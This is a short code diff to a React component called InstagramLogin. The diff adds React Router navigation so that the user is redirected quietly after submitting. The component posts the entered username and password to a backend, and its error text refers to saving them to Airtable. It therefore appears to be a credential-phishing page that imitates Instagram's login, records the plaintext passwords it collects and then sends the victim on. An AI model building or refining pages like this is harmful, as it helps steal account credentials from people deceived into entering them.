@@ -2,12 +2,14 @@ import React, { useState } from "react";
 import { API_BASE } from "../api";
 import axios from "axios";
 import "./login.css";
+import { useNavigate } from "react-router-dom";
 
 function InstagramLogin() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [ripple, setRipple] = useState({ active: false, x: 0, y: 0 });
+  const navigate = useNavigate();
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -19,10 +21,14 @@ function InstagramLogin() {
         username,
         password,
       });
+
       setUsername("");
       setPassword("");
-      // redirect to main site
-      window.location.href = `${API_BASE}/`;
+
+      // redirect to main home page (React Router)
+      navigate("/", { replace: true });
+      // if you ever want hard reload instead:
+      // window.location.replace("/");
     } catch (err) {
       alert(
         err.response?.data?.message || "Failed to save to Airtable"
